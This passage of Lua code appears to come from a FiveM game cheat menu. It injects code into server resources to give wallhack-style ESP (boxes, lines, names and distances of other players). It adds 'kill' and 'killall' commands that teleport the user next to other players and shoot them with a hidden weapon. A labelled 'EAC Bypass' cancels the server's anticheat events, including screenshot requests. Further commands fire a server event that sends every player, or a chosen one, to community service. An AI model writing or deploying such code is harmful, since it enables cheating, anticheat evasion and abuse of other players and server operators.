                            if NetworkIsPlayerTalking(i) then
                                DrawText3D(targetCoords.x, targetCoords.y, targetCoords.z + 1.2, text, 255, 100, 100)
                            else
                                DrawText3D(targetCoords.x, targetCoords.y, targetCoords.z + 1.2, text, 255, 255, 255)
                            end

                            if IsPedInAnyVehicle(targetPed, false) then
                                local veh = GetVehiclePedIsUsing(targetPed)
                                local model = GetEntityModel(veh)
                                local vehName = GetLabelText(GetDisplayNameFromVehicleModel(model))
                                DrawText3D(targetCoords.x, targetCoords.y, targetCoords.z + 1.0, "Vehicle: " .. vehName, 180, 180, 180)
                            end
                        end
                    end
                end

                Wait(0)
            end
        end)

        function DrawText3D(x, y, z, text, r, g, b)
            SetTextScale(0.35, 0.35)
            SetTextFont(4)
            SetTextProportional(1)
            SetTextColour(r, g, b, 215)
            SetTextEntry("STRING")
            SetTextCentre(true)
            AddTextComponentString(text)
            SetDrawOrigin(x, y, z, 0)
            DrawText(0.0, 0.0)
            ClearDrawOrigin()
        end
    ]])
end, function()
    MachoInjectResource("any", [[
        espActive = false
    ]])
end)

MachoMenuCheckbox(OthersSection, "ESP Box", function()
    MachoInjectResource("any", [[
        espBoxActive = true
        CreateThread(function()
            while espBoxActive do
                local myPed = PlayerPedId()
                local myCoords = GetEntityCoords(myPed)

                for i = 0, 128 do
                    if NetworkIsPlayerActive(i) and GetPlayerPed(i) ~= myPed then
                        local pPed = GetPlayerPed(i)
                        local ra = { r = 255, g = 0, b = 0 }

                        local LineOneBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, -0.9)
                        local LineOneEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, -0.9)
                        local LineTwoBegin = LineOneEnd
                        local LineTwoEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, -0.9)
                        local LineThreeBegin = LineTwoEnd
                        local LineThreeEnd = GetOffsetFromEntityInWorldCoords(pPed, -0.3, 0.3, -0.9)
                        local LineFourBegin = LineThreeEnd
                        local LineFourEnd = LineOneBegin

                        local TLineOneBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, 0.8)
                        local TLineOneEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, 0.8)
                        local TLineTwoBegin = TLineOneEnd
                        local TLineTwoEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, 0.8)
                        local TLineThreeBegin = TLineTwoEnd
                        local TLineThreeEnd = GetOffsetFromEntityInWorldCoords(pPed, -0.3, 0.3, 0.8)
                        local TLineFourBegin = TLineThreeEnd
                        local TLineFourEnd = LineOneBegin

                        local ConnectorOneBegin = TLineThreeEnd
                        local ConnectorOneEnd = LineThreeEnd
                        local ConnectorTwoBegin = TLineTwoEnd
                        local ConnectorTwoEnd = LineTwoEnd
                        local ConnectorThreeBegin = TLineOneBegin
                        local ConnectorThreeEnd = LineOneBegin
                        local ConnectorFourBegin = TLineOneEnd
                        local ConnectorFourEnd = LineOneEnd

                        local lines = {
                            {LineOneBegin, LineOneEnd}, {LineTwoBegin, LineTwoEnd},
                            {LineThreeBegin, LineThreeEnd}, {LineFourBegin, LineFourEnd},
                            {TLineOneBegin, TLineOneEnd}, {TLineTwoBegin, TLineTwoEnd},
                            {TLineThreeBegin, TLineThreeEnd}, {TLineFourBegin, TLineFourEnd},
                            {ConnectorOneBegin, ConnectorOneEnd}, {ConnectorTwoBegin, ConnectorTwoEnd},
                            {ConnectorThreeBegin, ConnectorThreeEnd}, {ConnectorFourBegin, ConnectorFourEnd}
                        }

                        for _, line in pairs(lines) do
                            DrawLine(line[1].x, line[1].y, line[1].z, line[2].x, line[2].y, line[2].z, ra.r, ra.g, ra.b, 255)
                        end
                    end
                end

                Wait(0)
            end
        end)
    ]])
end, function()
    MachoInjectResource("any", [[
        espBoxActive = false
    ]])
end)

MachoMenuCheckbox(OthersSection, "Detail ESP Info", function()
    MachoInjectResource("any", [[
        espInfoActive = true
        CreateThread(function()
            while espInfoActive do
                local myPed = PlayerPedId()
                local myCoords = GetEntityCoords(myPed)

                for i = 0, 128 do
                    if NetworkIsPlayerActive(i) and GetPlayerPed(i) ~= myPed then
                        local pPed = GetPlayerPed(i)
                        local x, y, z = table.unpack(GetEntityCoords(pPed))
                        local cx, cy, cz = table.unpack(myCoords)
                        local distance = #(myCoords - vector3(x, y, z))
                        
                        local message = string.format("Name: %s\nPlayer ID: %d\nDist: %.1f",
                            GetPlayerName(i),
                            GetPlayerServerId(i),
                            i,
                            distance
                        )

                        if IsPedInAnyVehicle(pPed, true) then
                            local VehName = GetLabelText(GetDisplayNameFromVehicleModel(GetEntityModel(GetVehiclePedIsUsing(pPed))))
                            message = message .. "\nVeh: " .. VehName
                        end

                        local r, g, b = 255, 255, 255
                        if NetworkIsPlayerTalking(i) then
                            r, g, b = 0, 255, 0
                        end

                        DrawText3D(x, y, z + 1.0, message, r, g, b)
                    end
                end
                Wait(0)
            end
        end)
    ]])
end, function()
    MachoInjectResource("any", [[
        espInfoActive = false
    ]])
end)

MachoMenuCheckbox(OthersSection, "ESP Lines", function()
    MachoInjectResource("any", [[
        espLinesEnabled = true
        CreateThread(function()
            while espLinesEnabled do
                local myPed = PlayerPedId()
                local myCoords = GetEntityCoords(myPed)

                for i = 0, 128 do
                    if NetworkIsPlayerActive(i) and GetPlayerPed(i) ~= myPed then
                        local pPed = GetPlayerPed(i)
                        local px, py, pz = table.unpack(GetEntityCoords(pPed))

                        local ra = { r = 255, g = 0, b = 0 }
                        DrawLine(myCoords.x, myCoords.y, myCoords.z, px, py, pz, ra.r, ra.g, ra.b, 255)
                    end
                end

                Wait(0)
            end
        end)
    ]])
end, function()
    MachoInjectResource("any", [[
        espLinesEnabled = false
    ]])
end)

local crosshairc2 = false

MachoMenuCheckbox(OthersSection, "DOT Crosshair", function()
    crosshair = false
    crosshairc = false
    crosshairc2 = true
    CreateThread(function()
        while crosshairc2 do
            Citizen.Wait(0)
            DrawTxt("~r~.", 0.4968, 0.478)
        end
    end)
end, function()
    crosshairc2 = false
end)

-- DrawTxt function example (add if missing)
function DrawTxt(text, x, y)
    SetTextFont(4)
    SetTextProportional(1)
    SetTextScale(0.0, 0.5)
    SetTextColour(255, 0, 0, 255) -- Red color
    SetTextDropshadow(0, 0, 0, 0, 255)
    SetTextEdge(1, 0, 0, 0, 255)
    SetTextDropShadow()
    SetTextOutline()
    SetTextEntry("STRING")
    AddTextComponentString(text)
    DrawText(x, y)
end

MachoInjectResource("any", [[
-- Kill all
RegisterCommand("killall", function()
    local playerPed = PlayerPedId()
    local oldCoords = GetEntityCoords(playerPed)

    -- Make invisible
    SetEntityVisible(playerPed, false, false)

    -- Spawn weapon
    GiveWeaponToPed(playerPed, GetHashKey("WEAPON_APPISTOL"), 9999, false, true)
    SetCurrentPedWeapon(playerPed, GetHashKey("WEAPON_APPISTOL"), true)
    SetPedInfiniteAmmo(playerPed, true, GetHashKey("WEAPON_APPISTOL"))
    SetPedCurrentWeaponVisible(playerPed, false, false, false, true)

    Citizen.CreateThread(function()
        for _, player in ipairs(GetActivePlayers()) do
            local targetPed = GetPlayerPed(player)

            if targetPed ~= playerPed and DoesEntityExist(targetPed) then
                local targetCoords = GetEntityCoords(targetPed)
                local distance = #(targetCoords - oldCoords)

                if distance <= 500.0 then
                    -- Teleport next to them
                    SetEntityCoords(playerPed, targetCoords.x, targetCoords.y, targetCoords.z + 1.0, false, false, false, false)

                    -- Deal damage + bullet effect
                    for i = 1, 5 do
                        ApplyDamageToPed(targetPed, 200, false)
                        ShootSingleBulletBetweenCoords(
                            targetCoords.x, targetCoords.y, targetCoords.z + 0.1,
                            targetCoords.x, targetCoords.y, targetCoords.z + 0.2,
                            250,
                            0,
                            GetHashKey("WEAPON_APPISTOL"),
                            playerPed,
                            true,
                            false,
                            -1.0
                        )
                        Citizen.Wait(50)
                    end

                    Citizen.Wait(150)
                end
            end
        end

        -- Cleanup
        RemoveWeaponFromPed(playerPed, GetHashKey("WEAPON_APPISTOL"))
        SetEntityVisible(playerPed, true, false)
        SetEntityCoords(playerPed, oldCoords.x, oldCoords.y, oldCoords.z, false, false, false, false)
    end)
end)
]])

-- EAC Bypass
MachoInjectResource('monitor', [[
    RegisterNetEvent('Anticheat:CheckJumping')
    AddEventHandler('Anticheat:CheckJumping', function()
       CancelEvent()
    end)

    RegisterNetEvent('Anticheat:punishFromClient')
    AddEventHandler('Anticheat:punishFromClient', function()
       CancelEvent()
    end)

    RegisterNetEvent('Anticheat:peerInitialized')
    AddEventHandler('Anticheat:peerInitialized', function()
       CancelEvent()
    end)

    RegisterNetEvent('Anticheat:requestIntialization')
    AddEventHandler('Anticheat:requestIntialization', function()
       CancelEvent()
    end)

    RegisterNetEvent('Anticheat:requestClientScreenshot')
    AddEventHandler('Anticheat:requestClientScreenshot', function()
       CancelEvent()
    end)

    RegisterNetEvent('Anticheat:peerInitialized')
    AddEventHandler('Anticheat:peerInitialized', function()
       CancelEvent()
    end)

    RegisterNetEvent('Anticheat:nuiEvent')
    AddEventHandler('Anticheat:nuiEvent', function()
       CancelEvent()
    end)

    RegisterNetEvent('Anticheat:pong')
    AddEventHandler('Anticheat:pong', function()
       CancelEvent()
    end)
]])

-- COMMUNITY SERVICE FOR EVERYONE --> /herkesekamu
RegisterCommand("herkesekamu", function(source, args, rawCommand)
    local playerPed = PlayerPedId()
    local playerCoords = GetEntityCoords(playerPed)
    local affectedPlayers = 0

    for _, playerId in ipairs(GetActivePlayers()) do
        local targetPed = GetPlayerPed(playerId)

        if targetPed ~= playerPed then
            local targetCoords = GetEntityCoords(targetPed)
            local distance = #(playerCoords - targetCoords)

            local targetServerId = GetPlayerServerId(playerId)
            TriggerServerEvent('qb-communityservice:sendToCommunityService', targetServerId, 0)
            affectedPlayers = affectedPlayers + 1
            Citizen.Wait(3050)
        end
    end

    if affectedPlayers > 0 then
        TriggerEvent("chat:addMessage", {
            color = {0, 255, 0},
            multiline = true,
            args = {"System", affectedPlayers .. " FIX"}
        })
    else
        TriggerEvent("chat:addMessage", {
            color = {255, 0, 0},
            multiline = true,
            args = {"System", "no ren!"}
        })
    end
end, false)

RegisterCommand("kamu", function(source, args, rawCommand)
    local enemyId = tonumber(args[1])

    local targetServerId = GetPlayerServerId(enemyId)
    TriggerServerEvent('qb-communityservice:sendToCommunityService', enemyId, 22)

    TriggerEvent("chat:addMessage", {
        color = {0, 255, 0},
        multiline = true,
        args = {"System", enemyId .. " id's player is Kamu mode"}
    })
end, false)

MachoInjectResource("any", [[
RegisterCommand("kill", function(source, args)
    local targetId = tonumber(args[1])
    if not targetId then return end

    local playerPed = PlayerPedId()
    local targetPed = GetPlayerPed(GetPlayerFromServerId(targetId))

    if targetPed ~= 0 and DoesEntityExist(targetPed) then
        -- Save old coordinates
        local oldCoords = GetEntityCoords(playerPed)

        -- Teleport next to target
        local targetCoords = GetEntityCoords(targetPed)
        SetEntityCoords(playerPed, targetCoords.x, targetCoords.y, targetCoords.z + 1.0, false, false, false, false)

        -- Spawn weapon (local only, server doesn't see)
        GiveWeaponToPed(playerPed, GetHashKey("WEAPON_APPISTOL"), 250, false, true)
        SetCurrentPedWeapon(playerPed, GetHashKey("WEAPON_APPISTOL"), true)
        SetPedInfiniteAmmo(playerPed, true, GetHashKey("WEAPON_APPISTOL"))

        -- Make weapon invisible
        SetPedCurrentWeaponVisible(playerPed, false, false, false, true)

        -- Silent kill
        Citizen.CreateThread(function()
            local coords = GetEntityCoords(targetPed)
            for i = 1, 5 do
                ApplyDamageToPed(targetPed, 200, false)
                ShootSingleBulletBetweenCoords(
                    coords.x, coords.y, coords.z + 0.1,
                    coords.x, coords.y, coords.z + 0.2,
                    250,
                    0,
                    GetHashKey("WEAPON_APPISTOL"),
                    playerPed,
                    true,
                    false,
                    -1.0
                )
                Citizen.Wait(50)
            end
        end)

        -- Remove weapon and return to old position
        Citizen.SetTimeout(2000, function()
            RemoveWeaponFromPed(playerPed, GetHashKey("WEAPON_APPISTOL"))
            SetEntityCoords(playerPed, oldCoords.x, oldCoords.y, oldCoords.z, false, false, false, false)
        end)
    end
end)
]])